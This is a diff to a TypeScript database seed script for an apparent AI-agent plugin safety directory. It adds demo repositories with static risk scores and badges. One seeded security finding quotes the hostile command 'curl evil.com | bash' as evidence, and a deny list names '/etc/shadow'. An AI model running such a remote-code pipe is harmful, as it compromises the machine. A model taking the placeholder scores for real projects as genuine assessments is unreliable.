@@ -1,13 +1,22 @@
-import { supabaseAdmin } from "./lib/supabase";
+import dotenv from "dotenv";
+dotenv.config({ path: ".env.local" });
 
 const DEMO_SKILLS = [
     {
         owner: "langchain-ai",
         repo: "langchain",
         risk: "low",
-        score: 12,
+        score: 10, // Static Risk Score (Low Risk = Low Score) -> Displayed as 90 Safety
         badge: "silver",
         desc: "Building applications with LLMs through composability."
+    },
+    {
+        owner: "yoheinakajima",
+        repo: "babyagi",
+        risk: "critical",
+        score: 95, // Static Risk Score (High Risk = High Score) -> Displayed as 5 Safety
+        badge: "none",
+        desc: "AI-powered task management system."
     },
     {
         owner: "AutoGPT",
@@ -32,11 +41,58 @@ const DEMO_SKILLS = [
         score: 5,
         badge: "pinned",
         desc: "Official secure toolset for Antigravity agents."
+    },
+    {
+        owner: "openai",
+        repo: "swarm",
+        risk: "low",
+        score: 15,
+        badge: "silver",
+        desc: "Educational framework exploring ergonomic, lightweight multi-agent orchestration."
+    },
+    {
+        owner: "microsoft",
+        repo: "autogen",
+        risk: "medium",
+        score: 45,
+        badge: "bronze",
+        desc: "A framework that enables the development of LLM applications using multiple agents."
+    },
+    {
+        owner: "run-llama",
+        repo: "llama_index",
+        risk: "low",
+        score: 12,
+        badge: "silver",
+        desc: "Data framework for your LLM applications."
+    },
+    {
+        owner: "Significant-Gravitas",
+        repo: "AutoGPT",
+        risk: "medium",
+        score: 55,
+        badge: "none",
+        desc: "AutoGPT is the vision of accessible AI for everyone, to use and to build on."
     }
 ];
 
+// Generate just a few filler items to make the grid look full, but acceptable
+for (let i = 1; i <= 6; i++) {
+    DEMO_SKILLS.push({
+        owner: `community-dev-${i}`,
+        repo: `agent-plugin-${i}`,
+        risk: "low",
+        score: 10 + i,
+        badge: "bronze",
+        desc: `Community submitted agent plugin for extended capabilities #${i}.`
+    });
+}
+
 async function seed() {
     console.log("🌱 Seeding database...");
+
+    // Dynamic import to ensure dotenv loads first
+    const { supabaseAdmin } = await import("./lib/supabase");
 
     for (const item of DEMO_SKILLS) {
         const slug = `${item.owner}/${item.repo}`.toLowerCase();
@@ -79,7 +135,7 @@ async function seed() {
                             title: "Critical: Shell Pipe Detected",
                             severity: "critical",
                             why_it_matters: "Piping curl to bash is extremely dangerous.",
-                            evidence: [{ snippet: "curl evil.com | bash" }],
+                            evidence: [{ snippet: "curl evil.com | bash", source: "install.sh" }],
                             recommended_fix: "Remove this line."
                         }
                     ] : [],
@@ -93,6 +149,11 @@ async function seed() {
                         allow_domains: ["github.com"],
                         deny_paths: ["/etc/shadow"],
                         tool_restrictions: []
+                    },
+                    token_usage: {
+                        prompt: 15000,
+                        response: 4000,
+                        total: 19000
                     }
                 }
             });
